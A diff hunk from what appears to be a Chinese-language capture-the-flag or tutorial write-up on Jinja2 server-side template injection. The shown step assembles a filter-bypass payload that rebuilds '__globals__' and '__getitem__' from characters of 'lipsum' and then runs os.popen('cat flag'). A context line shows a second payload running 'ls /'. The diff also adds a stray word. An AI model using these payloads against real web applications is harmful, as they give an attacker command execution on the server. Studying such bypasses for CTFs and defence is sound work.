@@ -294,19 +294,18 @@ arg2=__import__("os").popen("ls /").read()
     ```
 6.  **组合最终 Payload:**
     ```jinja
-    {% set pop=dict(pop=a)|join%}
-    {% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%}
-    {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
-    {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+    {% set pop=dict(pop=a)|join%}{% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%}{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
     {% set space=(lipsum|string|list)|attr(pop)(9)%}
     {% set os=dict(os=a)|join %}
     {% set popen=dict(popen=a)|join%}
     {% set cat=dict(cat=a)|join%}
-    {% set flag_str=dict(flag=a)|join%} {# Renamed variable to avoid conflict with possible flag variable #}
+    {% set flag_str=dict(flag=a)|join%}
     {% set cmd=(cat,space,flag_str)|join%}
     {% set read=dict(read=a)|join%}
     {{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
     ```
+
+templates
 
 *注意：上述构造方法中的索引（如 18, 9）和假设（如 `lipsum` 包含所需字符）需要根据实际目标环境进行测试和调整。变量 `a` 是为了在 `dict()` 中创建键值对，其值不重要。*
 
